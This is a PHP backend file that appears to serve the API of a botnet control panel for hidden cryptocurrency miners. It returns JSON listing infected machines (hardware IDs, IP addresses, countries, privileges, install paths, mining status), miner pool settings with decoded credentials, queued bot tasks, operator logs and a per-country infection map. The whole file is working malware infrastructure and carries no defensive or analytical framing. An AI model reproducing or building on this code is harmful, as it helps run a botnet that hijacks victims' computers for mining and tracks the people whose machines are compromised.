<?php

error_reporting(E_ALL);
ini_set('display_errors', 1);

function changebool($input){
    if($input == 1){
        return true;
    }else{
        return false;
    }
}


switch ($_GET["get"]) {
    case "settings":
        $Settings = new Settings($db);
       
        $stmt = $Settings->read();
        $num = $stmt->rowCount();
        if($num>0){
            $Settings_arr=array();
            $Settings_arr["records"]=array();
    
            while ($row = $stmt->fetch(PDO::FETCH_ASSOC)){
                extract($row);
                $settings_item=array(
                    "id" => $id,
                    "knock" => $knock,
                    "dead" => $dead,
                    "gate_status" => changebool($gate_status),
                    "miner_autostart" => changebool($miner_autostart),
                    "miner_hwidAsUser" => changebool ($miner_hwidAsUser),
                    "mining_algorithm" => base64_decode ($mining_algorithm),
                    "mining_server" => base64_decode ($mining_server),
                    "mining_username" => base64_decode ($mining_username),
                    "mining_password" => base64_decode ($mining_password),
                );
             
                array_push($Settings_arr["records"], $settings_item);
            }
           
            http_response_code(200);
            if($DEBUG){
           
                r($Settings_arr);
            }else{

                echo json_encode($Settings_arr);
            }
        }else{
            http_response_code(404);
            echo json_encode(
                array("message" => "No Settings found.")
            );
        }
        break;
    case "bots":
        $Settings = new Bots($db);
        $stmt = $Settings->read();
        $num = $stmt->rowCount();
        if($num>0){
            $Settings_arr=array();
            $Settings_arr["records"]=array();
            while ($row = $stmt->fetch(PDO::FETCH_ASSOC)){
                extract($row);
                if( $status == "offline"){
                    if($miningstatus == "Minning"){
                        $miningstatus = "Idle";
                    }
                }
                
                $settings_item=array(
                    "id" => $id,
                    "bothwid" => $bothwid,
                    "ipaddress" => $ipaddress,
                    "country" => $country,
                    "installdate" => $installdate,
                    "lastresponse" => $lastresponse,
                    "currenttask" => $currenttask,
                    "operatingsys" => $operatingsys,
                    "botversion" => $botversion,
                    "privileges" => $privileges,
                    "installationpath" => $installationpath,
                    "computername" => base64_decode($computername),
                    "lastreboot" => $lastreboot,
                    "lastminerstart" => $lastminerstart,
                    "miningstatus" => $miningstatus,
                    "cpu" => $cpu,
                    "gpu" => $gpu,
                    "mark" => $mark,
                    "status" => $status,
                );
                array_push($Settings_arr["records"], $settings_item);
            }
            http_response_code(200);
            if($DEBUG){
                r($Settings_arr);
            }else{
                echo json_encode($Settings_arr);
            }
        }else{
            http_response_code(404);
            echo json_encode(
                array("message" => "No Bots found.")
            );
        }
        break;
    case "botstats":
        $Settings = new Bots($db);
        $stats = $Settings->stats();
        if($stats>0){
            http_response_code(200);
            if($DEBUG){
                r($stats);
            }else{
                echo json_encode($stats);
            }
        }else{
            http_response_code(404);
            echo json_encode(
                array("message" => "No Botstats  found.")
            );
        }
        break;
    case "plogs":
        $PanelLogs = new Plogs($db);
        $stmt = $PanelLogs->read();
        $num = $stmt->rowCount();
        if($num>0){
            $Settings_arr=array();
            $Settings_arr["records"]=array();
            while ($row = $stmt->fetch(PDO::FETCH_ASSOC)){
                extract($row);
                $settings_item=array(
                    "id" => $id,
                    "username" => $username,
                    "ipaddress" => $ipaddress,
                    "action" => $action,
                    "date" => $date,
                );
                array_push($Settings_arr["records"], $settings_item);
            }
            http_response_code(200);
            if($DEBUG){
                r($Settings_arr);
            }else{
                echo json_encode($Settings_arr);
            }
        }else{
            http_response_code(200);
            echo json_encode(
                array("records"=> array(),"message" => "No Panel Logs found.")
            );
        }
        break;
        case "tasks":
        $PanelLogs = new Tasks($db);
        $stmt = $PanelLogs->read();
        $num = $stmt->rowCount();
        if($num>0){
            $Settings_arr=array();
            $Settings_arr["records"]=array();
            while ($row = $stmt->fetch(PDO::FETCH_ASSOC)){
                extract($row);
                $execs = $db->prepare("SELECT COUNT(*) FROM tasks_completed WHERE taskid = :i");
                $execs->execute(array(":i" => $id));
				$ex = $execs->fetchColumn(0);
                //SELECT COUNT(*) FROM tasks_completed WHERE taskid = :i
                $settings_item=array(
                    "id" => $id,
                    "task" => $task,
                    "params" => $params,
                    "filters" => $filters,
                    "executions" => $executions,
                    "username" => $username,
                    "status" => $status,
                    "execution_only" => $execution_only,
                    "executed" => $ex,
                    "date" => $date,
                );
                array_push($Settings_arr["records"], $settings_item);
            }
            http_response_code(200);
            if($DEBUG){
                r($Settings_arr);
            }else{
                echo json_encode($Settings_arr);
            }
        }else{
            http_response_code(404);
            echo json_encode(
                array("message" => "No Tasks found.")
            );
        }
        break;
        case "users":
        $PanelLogs = new Users($db);
        $stmt = $PanelLogs->read();
        $num = $stmt->rowCount();
        if($num>0){
            $Settings_arr=array();
            $Settings_arr["records"]=array();
            while ($row = $stmt->fetch(PDO::FETCH_ASSOC)){
                extract($row);
                $settings_item=array(
                    "id" => $id,
                    "username" => $username,
                  //  "password" => $password,
                    "privileges" => $privileges,
                    "status" => $status,

                );
                array_push($Settings_arr["records"], $settings_item);
            }
            http_response_code(200);
            if($DEBUG){
                r($Settings_arr);
            }else{
                echo json_encode($Settings_arr);
            }
        }else{
            http_response_code(404);
            echo json_encode( 
                array("message" => "No Users found.")
            );
        }
        break;
        case "wordmap":
                include(__DIR__."/assets/geo/geoip.inc");
                $gi = geoip_open(__DIR__."/assets/geo/GeoIP.dat", "");
                $sql = "SELECT country, count(*) as NUM FROM bots GROUP BY country";
                $return = array();
                foreach ($db->query($sql) as $row) {
                    $return[ strtolower(geoip_country_code_by_id($gi , $row["country"]))] = intval ($row["NUM"]);
                 }
                echo json_encode($return);
        break;
}

?>